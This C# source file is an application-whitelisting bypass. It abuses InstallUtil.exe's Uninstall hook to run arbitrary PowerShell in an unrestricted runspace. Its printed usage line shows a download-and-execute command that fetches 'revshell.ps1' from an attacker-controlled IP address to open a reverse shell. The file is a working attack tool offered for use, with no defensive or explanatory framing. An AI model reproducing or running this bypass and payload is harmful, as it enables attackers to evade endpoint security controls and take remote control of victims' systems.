using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // checking for cmd
            string cmd = "";
            if (args != null && args.Length > 0)
            {
                cmd = args[0];
            }

            Console.WriteLine("Example Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /cmd=\'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.X.Y/revshell.ps1\")\' /U " + System.AppDomain.CurrentDomain.FriendlyName);
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            string cmd = this.Context.Parameters["cmd"];
            if (cmd == null)
            {
                throw new InstallException("Mandatory parameter 'cmd' empty");
            }
            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}